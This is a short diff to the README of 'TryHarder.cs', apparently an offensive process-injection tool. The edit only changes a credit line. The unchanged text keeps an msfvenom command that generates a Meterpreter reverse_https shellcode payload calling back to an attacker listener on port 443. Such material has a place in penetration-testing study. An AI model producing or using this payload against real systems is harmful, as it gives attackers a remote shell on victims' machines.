@@ -1,6 +1,6 @@
 ## TryHarder.cs
 
-Another Process Injection technique that loads the shellcode remotely, thanks to [saulgoodman](https://github.com/saulg00dmin) for pointing out this technique.<br>
+Another Process Injection technique that loads the shellcode remotely, thanks to [saulgoodman](https://github.com/saulg00dmin) for developing this technique.<br>
 
 Create Shellcode using msfvenom:<br>
 - `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f raw EXITFUNC=thread -o shellcode.bin`
